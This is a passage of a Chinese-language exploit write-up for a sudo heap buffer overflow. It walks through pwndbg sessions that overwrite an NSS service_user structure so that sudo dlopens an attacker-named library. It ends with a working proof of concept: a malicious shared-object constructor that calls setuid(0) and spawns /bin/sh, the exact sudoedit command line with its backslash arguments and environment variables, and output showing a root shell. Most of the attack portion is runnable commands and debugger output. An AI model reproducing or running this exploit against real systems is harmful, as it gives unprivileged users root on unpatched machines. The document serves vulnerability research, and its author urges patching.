    pwndbg> p (void*)__nss_group_database->name - (void*)sudo_user.cmnd_args                                     
    $40 = 288
现在我们已经构造好了内存布局，接下来我们调整环境变量，实现修改 _nss_group_database
{library、name}的值。如果要真正实现漏洞利用，需要将libary的值修改成NULL，name修改一个两个字节以上的字符串。根据漏洞特点连续的{‘\’
‘\’ ‘\’ ‘\’ …}会溢出成一个连续0的内存空间，如果要修改libary为NULL，至少要连续八个‘\’
以上，然后我们接着构造溢出参数，实现修改library的目的。
    pwndbg> b set_cmnd 
    Breakpoint 1 at 0x7fdc9f272fd0: file ./sudoers.c, line 922.
    pwndbg> set env 1 xxxxx
    pwndbg> r -s 'xxxxxx' 'x' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\'
    ...
    pwndbg> search -t string -s files
    sudo            0x557da6f2f370 0x73656c6966 /* 'files' */
    sudo            0x557da6f2f3b2 0x65730073656c6966 /* 'files' */
    [heap]          0x557da7cd4190 0x73656c6966 /* 'files' */
    [heap]          0x557da7cd68f0 0x73656c6966 /* 'files' */
    [heap]          0x557da7cd6990 0x73656c6966 /* 'files' */
    [heap]          0x557da7cd69f0 0x73656c6966 /* 'files' */
    [heap]          0x557da7cd6a50 0x73656c6966 /* 'files' */
    [heap]          0x557da7cd6b50 0x73656c6966 /* 'files' */
    [heap]          0x557da7cd6c00 0x73656c6966 /* 'files' */
    [heap]          0x557da7cd6cb0 0x73656c6966 /* 'files' */
    [heap]          0x557da7cd6d50 0x73656c6966 /* 'files' */
    [heap]          0x557da7cd6df0 0x73656c6966 /* 'files' */
    sudoers.so      0x7f60ad46b339 0x73000073656c6966 /* 'files' */
    libc-2.31.so    0x7f60adecd9c7 0x65540073656c6966 /* 'files' */
    libc-2.31.so    0x7f60adececc5 0x6f680073656c6966 /* 'files' */
    libc-2.31.so    0x7f60aded070e 0x652f0073656c6966 /* 'files' */
    libc-2.31.so    0x7f60aded36a9 0x49000073656c6966 /* 'files' */
    ld-2.31.so      0x7f60adf9216d 0x73656c6966 /* 'files' */
    pwndbg> p *__nss_passwd_database
    $1 = {
      next = 0x557da7cd4440,
      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN},
      library = 0x557da7cd58f0,
      known = 0x557da7cd58b0,
      name = 0x557da7cd4190 "files"
    }
    pwndbg> p *(service_user *)(0x557da7cd68f0 - 0x30)                                                           $2 = {
      next = 0x557da7cd6900,
      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN},
      library = 0x0,
      known = 0x0,
      name = 0x557da7cd68f0 "files"
    }
    pwndbg> hexdump 0x557da7cd68e0                                                                               +0000 0x557da7cd68e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
    +0010 0x557da7cd68f0  66 69 6c 65  73 00 00 00  41 00 00 00  00 00 00 00  │file│s...│A...│....│
    +0020 0x557da7cd6900  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
    +0030 0x557da7cd6910  00 00 00 00  01 00 00 00  01 00 00 00  00 00 00 00  │....│....│....│....│
    pwndbg> b sudoers.c:1014                                                           
    Breakpoint 3 at 0x7fa8a7fcf19d: sudoers.c:1014. (2 locations)
    pwndbg> c
    ...
    pwndbg> hexdump 0x557da7cd68e0
    +0000 0x557da7cd68e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 31  │....│....│....│...1│
    +0010 0x557da7cd68f0  3d 2f 78 78  78 78 20 00  00 00 00 00  00 00 00 00  │=xxx│xx..│....│....│
    +0020 0x557da7cd6900  00 00 00 00  00 00 00 00  31 3d 2f 78  78 78 78 20  │....│....│1=xx│xxx.│
    +0030 0x557da7cd6910  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
    pwndbg> p *(service_user *)(0x557da7cd68f0 - 0x30)
    $3 = {
      next = 0x2078,
      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, (unknown: 792539392), (unknown: 2021161080)},
      library = 0x0,
      known = 0x3100000000000000,
      name = 0x557da7cd68f0 "=xxxxx "
    }
    pwndbg> c
    Continuing.
    Program received signal SIGSEGV, Segmentation fault.
    __GI___tsearch (key=key@entry=0x7ffd5fbe59f8, vrootp=vrootp@entry=0x557da7cd68e8, compar=compar@entry=0x7f60ade5c090 ) at tsearch.c:309
    ───[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────
    00:0000│ rsp  0x7ffd5fbe5990 —▸ 0x7f60adecd36a ◂— 0x6225206125000200
    01:0008│      0x7ffd5fbe5998 —▸ 0x7f60ade5c090 (known_compare) ◂— endbr64 
    02:0010│      0x7ffd5fbe59a0 ◂— 0x0
    03:0018│      0x7ffd5fbe59a8 —▸ 0x7f60ade5c8ec (__nss_database_lookup2+204) ◂— test   eax, eax
    04:0020│      0x7ffd5fbe59b0 —▸ 0x557da7cdb308 ◂— 0x72007800746f6f72 /* 'root' */
    05:0028│      0x7ffd5fbe59b8 —▸ 0x557da7cd68c0 ◂— 0x2078 /* 'x ' */
    06:0030│      0x7ffd5fbe59c0 —▸ 0x7ffd5fbe5a40 ◂— 0x0
    07:0038│      0x7ffd5fbe59c8 —▸ 0x7ffd5fbe5ac8 ◂— 0x10001
    ───[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
     ► f 0     7f60ade32d46 tsearch+54
       f 1     7f60ade5ce51 __nss_lookup_function+97
       f 2     7f60addf813f internal_getgrouplist+175
       f 3     7f60addf83ed getgrouplist+109
       f 4     7f60adf356b6 sudo_getgrouplist2_v1+198
       f 5     7f60ad448433 sudo_make_gidlist_item+451
       f 6     7f60ad4471de sudo_get_gidlist+286
       f 7     7f60ad44051d runas_getgroups+93
       f 8     7f60ad42f5e2 set_perms+1186
       f 9     7f60ad42f5e2 set_perms+1186
       f 10     7f60ad428c40 sudoers_lookup+112
    pwndbg> f 1
    #1  0x00007f60ade5ce51 in __GI___nss_lookup_function (ni=ni@entry=0x557da7cd68c0, fct_name=, fct_name@entry=0x7f60adece9d7 "initgroups_dyn") at nsswitch.c:428
    428     nsswitch.c: No such file or directory.
    pwndbg> p ni
    $4 = (service_user *) 0x557da7cd68c0
    pwndbg> p *ni
    $5 = {
      next = 0x2078,
      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, (unknown: 792539392), (unknown: 2021161080)},
      library = 0x0,
      known = 0x3100000000000000,
      name = 0x557da7cd68f0 "=xxxxx "
    }
根据之前的方案分析，library修改为NULL，name修改成任意值应该，程序能运行到dlopen才对，不过事实证明不是这样的，于是我根据crash信息和源码，我发现不单要修改library为NULL，而且know也要修改为NULL，否则在执行tsearch会crash，根本运行不到nss_load_library的dlopen。接下来我们重新调整参数，修改library、know为NULL，name修改为任意字符串。
    pwndbg> b set_cmnd 
    Breakpoint 1 at 0x7fdc9f272fd0: file ./sudoers.c, line 922.
    pwndbg> b nss_load_library                                                                                   Note: breakpoint 2 also set at pc 0x7f2c3b3194c0.
    Breakpoint 2 at 0x7f2c3b3194c0: file nsswitch.c, line 329.
    pwndbg> r -s 'xxxxxxx' 'x' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\'
    ...
    pwndbg> p *(service_user *)0x55baa82948c0
    $1 = {
      next = 0x207878,
      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, (unknown: 1026621440), (unknown: 2021161080)},
      library = 0x0,
      known = 0x0,
      name = 0x55baa82948f0 "1=xxxxx "
    }
    pwndbg> c
    Continuing.
    Breakpoint 2, nss_load_library (ni=ni@entry=0x55baa82948c0) at nsswitch.c:329
    pwndbg> p *ni
    $1 = {
      next = 0x207878,
      actions = {NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, (unknown: 1026621440), (unknown: 2021161080)},
      library = 0x0,
      known = 0x55baa829eee0,
      name = 0x55baa82948f0 "1=xxxxx "
    }
    pwndbg> ni
    ...
    pwndbg> 
    0x00007f2c3b319627      359     in nsswitch.c
    ───[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────
       0x7f2c3b319611     mov    esi, 0x80000002
       0x7f2c3b319616     mov    rdi, rsp
       0x7f2c3b319619     mov    dword ptr [rax], 0x6f732e
       0x7f2c3b31961f     mov    byte ptr [rax + 5], 0
       0x7f2c3b319623     mov    word ptr [rax + 3], cx
     ► 0x7f2c3b319627     call   __libc_dlopen_mode 
            rdi: 0x7fff12ac9fa0 ◂— 'libnss_1=xxxxx .so.2'
            rsi: 0x80000002
            rdx: 0x8
            rcx: 0x322e
       0x7f2c3b31962c     mov    r10, qword ptr [rbp - 0x48]
       0x7f2c3b319630     mov    qword ptr [rbx + 8], rax
       0x7f2c3b319634     mov    rbx, qword ptr [r12 + 0x20]
       0x7f2c3b319639     cmp    qword ptr [rbx + 8], 0
       0x7f2c3b31963e     je     nss_load_library+507 
我们修正好了参数，再次运行，发现已经可以同时修改library和known为NULL，这时我们继续调试程序，证明已经可以执行到nss_load_library的断点
了，再查看ni是符合预期的，我们继续调试跟踪成到__libc_dlopen_mode之前，发先rdi第一参数是’libnss_1=xxxxx
.so.2’。到这里我们已经可以sudo程序打开一个任意字符名的so了。
​ 修改环境变量1的值为/xxxx，这样dlopen就会尝试打开一个 ‘libnss_1=/xxxx\
.so.2’的动态库。我实现了一个简单的shellcode测试一下这个POC。
    -> % id
    uid=1002(test) gid=1002(test) groups=1002(test)
    -> % mkdir -p libnss_1\=/
    -> % cat 
    void __attribute__((constructor)) init() {
        !setuid(0) && !setgid(0) && execl("/bin/sh", "sh", (char *) 0);
    }
    EOF
    -> % tree
    .
    └── libnss_1=
        └── xxxx .so.2
    1 directory, 1 file
    -> % env -i 1=/xxxx LC_IDENTIFICATION=en_US.UTF-8@xxxxxxxxxxxxx /tmp/sudo/bin/sudoedit -s 'xxxxxxx' 'x' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\' '\'
    sh-5.0# id
    uid=0(root) gid=0(root) groups=0(root),1002(test)
到此，这个POC已经实现了提权，接下来我会写一下自己的心得：
  * 理解内存管理的原理和对抗策略（内存分配算法、缓存算法一直都在升级，到目前为止还有很多可以利用的“姿势”，以后我可能会整理一份相关的笔记）
  * alsr只是随机化了内存基地址，在执行环境不变的情况下，反复执行同一个程序，各个内存变量之间的偏移是不变的。
  * 要有依据的利用蛮力测试方法构造有效参数。（这个也是目前fuzzing测试的优化点）
## 总结
这个漏洞不是一个RCE漏洞，直接危害程度应该不会很大，间接危程度还是很高的，建议大家还是尽早修补了吧。
引用
  * 